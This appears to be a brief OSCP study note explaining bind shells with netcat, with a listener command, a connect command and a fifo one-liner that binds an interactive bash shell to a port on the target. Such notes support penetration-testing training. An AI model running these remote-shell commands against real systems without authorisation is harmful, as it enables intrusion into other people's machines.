---
permalink: oscp/techniques/shells-and-payloads/untitled
title: Untitled
type: note
---
## Bind Shell Visual
![[Pasted image 20261118232928.png]]

## Bind shell with netcat

#### 1) Start netcat listener on Target
```bash
nc -lnvp <PORT>
```

#### 2) Attacker connects to target
```bash
nc -nv <TARGET IP> <PORT>
```

## Establishing Basic Bind Shell to Interact with Basg

#### 1) Put a bash shell on the TCP session on Target Machine
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <IP> <PORT> > /tmp/f
```
